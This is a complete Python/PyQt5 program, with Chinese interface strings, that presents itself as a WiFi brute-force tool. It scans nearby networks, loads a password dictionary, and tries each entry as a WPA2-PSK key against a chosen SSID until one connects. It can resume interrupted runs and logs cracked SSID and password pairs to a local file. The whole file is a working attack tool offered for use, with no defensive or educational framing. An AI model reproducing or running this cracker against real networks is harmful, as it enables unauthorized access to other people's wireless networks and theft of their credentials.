import sys
import time
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QListWidget, QPushButton, QLabel, QTextEdit, QFileDialog, QMessageBox, QHBoxLayout
)
from PyQt5.QtCore import QThread, pyqtSignal, QSettings
from pywifi import PyWiFi, const, Profile

class WiFiScanner(QThread):
    wifi_scanned = pyqtSignal(list)

    def run(self):
        wifi = PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(2)  # 等待扫描完成
        scan_results = iface.scan_results()
        networks = [(network.ssid.encode('raw_unicode_escape').decode('utf-8'), network.signal) for network in scan_results if network.ssid]
        self.wifi_scanned.emit(networks)

class WiFiCracker(QThread):
    log_signal = pyqtSignal(str)
    result_signal = pyqtSignal(bool)

    def __init__(self, ssid, password_file, start_index=0):
        super().__init__()
        self.ssid = ssid
        self.password_file = password_file
        self.start_index = start_index
        self.correct_password = None

    def run(self):
        wifi = PyWiFi()
        iface = wifi.interfaces()[0]

        with open(self.password_file, 'r') as file:
            passwords = file.readlines()

        total = len(passwords)
        start_time = time.time()

        for index, password in enumerate(passwords[self.start_index:], start=self.start_index):
            password = password.strip()  # 去掉换行符
            self.log_signal.emit(f"[{self.ssid}] 尝试密码: {password} ({index + 1}/{total})")

            profile = Profile()
            profile.ssid = self.ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            time.sleep(1)

            if iface.status() == const.IFACE_CONNECTED:
                self.correct_password = password
                self.log_signal.emit(f"[{self.ssid}] 密码正确: {password}")
                self.result_signal.emit(True)
                return

        elapsed = time.time() - start_time
        self.log_signal.emit(f"[{self.ssid}] 破解失败，耗时: {time.strftime('%H:%M:%S', time.gmtime(elapsed))}")
        self.result_signal.emit(False)

class WiFiCrackerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.settings = QSettings("WiFiCrackerApp", "WiFiCracker")
        self.active_crackers = {}
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("WiFi 暴力破解工具")
        self.resize(800, 400)

        layout = QHBoxLayout()

        left_layout = QVBoxLayout()

        self.list_widget = QListWidget()
        left_layout.addWidget(self.list_widget)

        self.selected_label = QLabel("选择的 WiFi: 无")
        left_layout.addWidget(self.selected_label)

        self.scan_button = QPushButton("扫描 WiFi")
        self.scan_button.clicked.connect(self.scan_wifi)
        left_layout.addWidget(self.scan_button)

        self.brute_force_button = QPushButton("暴力破解")
        self.brute_force_button.clicked.connect(self.start_brute_force)
        left_layout.addWidget(self.brute_force_button)

        layout.addLayout(left_layout)

        right_layout = QVBoxLayout()

        self.active_list_widget = QListWidget()
        self.active_list_widget.itemClicked.connect(self.select_active_cracker)
        right_layout.addWidget(self.active_list_widget)

        self.text_edit = QTextEdit()
        self.text_edit.setReadOnly(True)
        right_layout.addWidget(self.text_edit)

        layout.addLayout(right_layout)

        self.setLayout(layout)

        self.list_widget.itemClicked.connect(self.select_wifi)
        self.selected_wifi = None

    def scan_wifi(self):
        self.text_edit.append("正在扫描 WiFi...")
        self.scanner = WiFiScanner()
        self.scanner.wifi_scanned.connect(self.display_wifi)
        self.scanner.start()

    def display_wifi(self, networks):
        self.list_widget.clear()
        for ssid, signal in networks:
            self.list_widget.addItem(f"{ssid} (信号: {signal})")
        self.text_edit.append(f"扫描到 {len(networks)} 个 WiFi 网络")

    def select_wifi(self, item):
        self.selected_wifi = item.text().split(' ')[0]
        self.selected_label.setText(f"选择的 WiFi: {self.selected_wifi}")

        # 加载上次破解信息
        last_file = self.settings.value(f"{self.selected_wifi}/file", "")
        last_position = int(self.settings.value(f"{self.selected_wifi}/position", 0))

        if last_file:
            msg = QMessageBox()
            msg.setWindowTitle("破解历史")
            msg.setText(f"WiFi: {self.selected_wifi}\n上次使用文件: {last_file}\n上次进行到: {last_position} 行")
            msg.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            msg.setDefaultButton(QMessageBox.Yes)

            ret = msg.exec_()

            if ret == QMessageBox.Yes:
                self.start_brute_force(last_file, last_position)

    def start_brute_force(self, password_file=None, start_index=0):
        if not self.selected_wifi:
            self.text_edit.append("请先选择一个 WiFi")
            return

        if not password_file:
            password_file, _ = QFileDialog.getOpenFileName(self, "选择密码字典文件", "", "Text Files (*.txt);;All Files (*)")

        if not password_file:
            self.text_edit.append("未选择密码字典文件")
            return

        self.text_edit.append(f"开始破解 WiFi: {self.selected_wifi}，使用字典文件: {password_file}")

        self.settings.setValue(f"{self.selected_wifi}/file", password_file)
        self.settings.setValue(f"{self.selected_wifi}/position", start_index)

        cracker = WiFiCracker(self.selected_wifi, password_file, start_index)
        cracker.log_signal.connect(self.update_log)
        cracker.result_signal.connect(self.crack_finished)

        self.active_crackers[self.selected_wifi] = cracker
        self.active_list_widget.addItem(self.selected_wifi)

        cracker.start()

    def update_log(self, message):
        self.text_edit.append(message)

    def select_active_cracker(self, item):
        ssid = item.text()
        self.text_edit.append(f"当前正在破解 WiFi: {ssid}")
        if ssid in self.active_crackers:
            self.text_edit.append(f"显示日志: {ssid}")

    def crack_finished(self, success):
        sender = self.sender()
        ssid = sender.ssid

        if success:
            password = sender.correct_password
            self.text_edit.append(f"WiFi {ssid} 破解成功！密码是: {password}")
            with open("known_passwords.txt", "a") as file:
                file.write(f"{ssid} {password}\n")
            self.settings.remove(f"{ssid}/file")
            self.settings.remove(f"{ssid}/position")
        else:
            self.text_edit.append(f"WiFi {ssid} 破解失败！")

        self.active_crackers.pop(ssid, None)

        for i in range(self.active_list_widget.count()):
            if self.active_list_widget.item(i).text() == ssid:
                self.active_list_widget.takeItem(i)
                break

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = WiFiCrackerApp()
    window.show()
    sys.exit(app.exec_())
